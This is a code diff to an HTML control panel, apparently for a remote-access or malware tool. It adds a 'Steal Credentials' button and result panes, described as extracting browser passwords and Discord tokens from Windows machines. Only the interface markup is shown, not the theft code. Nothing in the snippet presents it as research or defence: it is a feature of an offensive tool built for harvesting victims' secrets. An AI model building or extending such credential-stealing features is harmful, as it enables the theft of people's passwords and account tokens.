@@ -254,6 +254,22 @@
             <div id="cleanup-result" class="hidden text-xs font-mono bg-slate-800/60 rounded p-2 max-h-32 overflow-y-auto"></div>
           </div>
 
+          <!-- Credential Stealer -->
+          <div class="mb-3 pb-3 border-b border-slate-800">
+            <div class="flex items-center gap-2 mb-2">
+              <button id="steal-btn"
+                class="flex items-center gap-2 px-3 py-1.5 bg-violet-900/40 hover:bg-violet-900/70 border border-violet-700/50 text-violet-300 rounded-lg text-xs font-medium transition-colors">
+                <i class="fa-solid fa-key"></i> Steal Credentials
+              </button>
+              <span class="text-xs text-slate-500">Extracts browser passwords &amp; Discord tokens (Windows only)</span>
+            </div>
+            <div id="steal-status" class="hidden text-xs text-slate-400 italic"></div>
+            <div id="steal-result" class="hidden mt-2">
+              <div id="steal-summary" class="text-xs text-slate-400 mb-1"></div>
+              <div id="steal-creds" class="text-xs font-mono bg-slate-800/60 rounded p-2 max-h-48 overflow-y-auto space-y-1"></div>
+            </div>
+          </div>
+
           <!-- Fun Actions -->
           <div>
             <div class="text-xs text-slate-500 mb-2 font-medium">Quick Actions</div>
